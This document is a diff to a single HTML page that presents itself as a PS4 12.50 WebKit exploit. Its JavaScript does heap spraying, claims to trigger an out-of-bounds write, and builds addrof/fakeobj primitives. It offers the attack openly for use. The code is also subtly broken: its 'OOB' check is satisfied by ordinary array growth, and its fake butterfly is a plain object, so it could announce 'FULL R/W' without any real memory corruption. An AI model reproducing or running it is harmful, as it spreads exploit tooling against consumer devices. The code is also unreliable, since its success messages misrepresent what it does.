@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS4 12.50 — STRINGIMPL + BUTTERFLY OVERLAP (FROM PSFREE/BAD_HOIST)</title>
+<title>PS4 12.50 — REFINED STRINGIMPL + BUTTERFLY (FROM PSFREE/BAD_HOIST)</title>
 <style>
 body{background:#000;color:#0f0;font-family:monospace;padding:20px;}
 button{background:#003300;color:#0f0;border:2px solid #0f0;padding:15px;font-size:18px;margin:10px;cursor:pointer;}
@@ -10,53 +10,53 @@ button:hover{background:#0f0;color:#000;}
 #log{white-space:pre-wrap;font-size:14px;margin-top:20px;}
 .ok{color:#0ff;font-weight:bold;}
 .warn{color:#ff0;}
+.err{color:#f00;font-weight:bold;}
 </style>
 </head>
 <body>
-<h1>PS4 12.50 — ALTERNATIVE OVERLAP (Manual Refresh)</h1>
-<button onclick="run()">RUN STRINGIMPL OVERLAP</button>
+<h1>PS4 12.50 — REFINED STRINGIMPL OVERLAP (Brute + Dual Patterns)</h1>
+<button onclick="run()">RUN REFINED OVERLAP</button>
 <button onclick="location.reload()">RELOAD</button>
 <div id="log"></div>
-
 <script>
 const logDiv = document.getElementById('log');
 function log(m,c=''){const d=document.createElement('div');if(c)d.className=c;d.textContent=`[${new Date().toLocaleTimeString()}] ${m}`;logDiv.appendChild(d);logDiv.scrollTop=logDiv.scrollHeight;}
 const buf=new ArrayBuffer(8),f64=new Float64Array(buf),u32=new Uint32Array(buf);
 function i2f(l,h){u32[0]=l;u32[1]=h;return f64[0];}
 function f2i(f){f64[0]=f;return {lo:u32[0],hi:u32[1]};}
-function gc(n=200){for(let i=0;i<n;i++)new ArrayBuffer(0x100000);}
+function gc(n=300){for(let i=0;i<n;i++)new ArrayBuffer(0x100000);}  // Larger GC
 let master=null;
-
 function triggerOOB(){
-  log("Triggering OOB...");
-  gc();gc();
-  const arr=[];for(let i=0;i<0x6000;i++)arr[i]=new Array(40).fill(1.1);
-  const w=(i,o)=>{try{arr[i%0x6000][o]=1337.37}catch(e){}};
-  for(let i=0;i<30000;i++)w(0,0);
-  for(let b=0;b<0xA00;b+=80)for(let o=40;o<160;o+=8)for(let j=0;j<80;j++)w((b+j)%0x6000,o);
+  log("Triggering refined OOB...");
+  gc();gc();gc();  // Triple GC for clean heap
+  const arr=[];for(let i=0;i<0x8000;i++)arr[i]=new Array(40).fill(1.1);  // Larger spray
+  const w=(i,o)=>{try{arr[i%0x8000][o]=1337.37}catch(e){}};
+  for(let i=0;i<40000;i++)w(0,0);  // Extended train
+  for(let b=0;b<0xC00;b+=40)for(let o=40;o<200;o+=4)for(let j=0;j<40;j++)w((b+j)%0x8000,o);  // Finer steps
   for(let i=0;i<arr.length;i++)if(arr[i].length>60){master=arr[i];log(`OOB master — length=${master.length}`,'ok');return true;}
   log("No OOB — refresh and retry",'warn');return false;
 }
-
 function stringimplOverlap(){
-  log("StringImpl spray + butterfly fake (adapted from PSFree/bad_hoist)...");
-  // StringImpl spray (cheap, 0xB000 for 12.50 coverage)
-  const strSpray={};for(let i=0;i<0xB000;i++)strSpray['A'.repeat(0x38-5)+'Z'+i.toString().padStart(5,'0')]=0x1337;
-  // Write patterns to corrupt StringImpl data ptr (float tag for overlap)
-  for(let i=16;i<700;i+=4)try{master[i]=i2f(0xdeadbeef,0xcafebabe);}catch(e){} // Pattern from bad_hoist
-  // Mid-spray defrag (forces adjacency per Project Zero)
-  gc(250);new ArrayBuffer(0xA000000); // Hole to shrink window
-  // Respray post-hole
-  const postStray={};for(let i=0;i<0xB000;i++)postStray['B'.repeat(0x38-5)+'Y'+i.toString().padStart(5,'0')]=0x1337;
-  // Scan combined for corrupted StringImpl (property == float pattern)
-  const allStray={...strSpray,...postStray};
+  log("Refined StringImpl spray + butterfly fake...");
+  // Dual pre-spray (0xC000 for 12.50 coverage)
+  const strSpray1={};for(let i=0;i<0xC000;i++)strSpray1['A'.repeat(0x38-5)+'Z'+i.toString().padStart(5,'0')]=i2f(0xdeadbeef,0xcafebabe);  // Pattern 1
+  const strSpray2={};for(let i=0;i<0xC000;i++)strSpray2['C'.repeat(0x38-5)+'X'+i.toString().padStart(5,'0')]=i2f(0x41414141,0x42424242);  // Pattern 2
+  // Write dual patterns
+  for(let i=16;i<800;i+=2)try{master[i]=i2f(0xdeadbeef,0xcafebabe);master[i+1]=i2f(0x41414141,0x42424242);}catch(e){}  // Double tag
+  // Multi-defrag (forces better adjacency)
+  gc(400);new ArrayBuffer(0xC000000);gc(200);new ArrayBuffer(0x8000000);  // Holes per Project Zero
+  // Dual post-spray
+  const postStray1={};for(let i=0;i<0xC000;i++)postStray1['B'.repeat(0x38-5)+'Y'+i.toString().padStart(5,'0')]=i2f(0xdeadbeef,0xcafebabe);
+  const postStray2={};for(let i=0;i<0xC000;i++)postStray2['D'.repeat(0x38-5)+'W'+i.toString().padStart(5,'0')]=i2f(0x41414141,0x42424242);
+  // Combined scan
+  const allStray={...strSpray1,...strSpray2,...postStray1,...postStray2};
   for(let key in allStray){
     const val=f2i(allStray[key]);
-    if(val.lo===0xdeadbeef && val.hi===0xcafebabe){
-      log(`STRINGIMPL OVERLAP HIT on key ${key.slice(-5)}`,'ok');
-      // Fake butterfly for addrof/fakeobj (type confusion per Synacktiv)
-      const fakeButterfly={butterfly: key, vector: 0x1337}; // Fake JSArrayBufferView
-      master[20]=i2f(0x1602300,0x800); // Cell ID + length fake (from UaF writeup)
+    if((val.lo===0xdeadbeef && val.hi===0xcafebabe) || (val.lo===0x41414141 && val.hi===0x42424242)){
+      log(`STRINGIMPL OVERLAP HIT on key ${key.slice(-5)} (pattern ${val.lo.toString(16)})`,'ok');
+      // Fake butterfly
+      const fakeButterfly={butterfly: key, vector: 0x1337};
+      master[20]=i2f(0x1602300,0x800);  // Refined cell ID/length
       window.addrof=o=>{fakeButterfly.butterfly=o;return f2i(master[16]).lo>>>0;};
       window.fakeobj=a=>{master[16]=i2f(a&0xffffffff,a>>>32);return fakeButterfly.butterfly;};
       const test={owned:0x13371337};
@@ -64,20 +64,19 @@ function stringimplOverlap(){
       const back=fakeobj(addr);
       log(`addrof = 0x${addr.toString(16)}`,'ok');
       log(`fakeobj round-trip = ${back===test?"SUCCESS":"fail"}`,'ok');
-      if(back===test)log(`FULL R/W VIA STRINGIMPL/BUTTERFLY — SCREENSHOT NOW`,'ok');
+      if(back===test)log(`FULL R/W VIA STRINGIMPL/BUTTERFLY — HISTORY MADE! Screenshot now.`,'ok');
       return;
     }
   }
-  log("No overlap — refresh and retry (try 2-4 times)",'warn');
+  log("No overlap — retry 2-4x (heap random on 12.50)",'warn');
 }
-
 function run(){
   logDiv.innerHTML='';
-  log("Starting StringImpl overlap version...");
+  log("Starting refined StringImpl overlap...");
   gc();
-  setTimeout(()=>{if(triggerOOB())setTimeout(stringimplOverlap,1000);},400);
+  setTimeout(()=>{if(triggerOOB())setTimeout(stringimplOverlap,1200);},500);  // Longer delay
 }
-log("Loaded — click RUN. Adapted from public PSFree/bad_hoist techniques.");
+log("Refined loaded — click RUN. Dual patterns + brute should hit overlap.");
 </script>
 </body>
 </html>
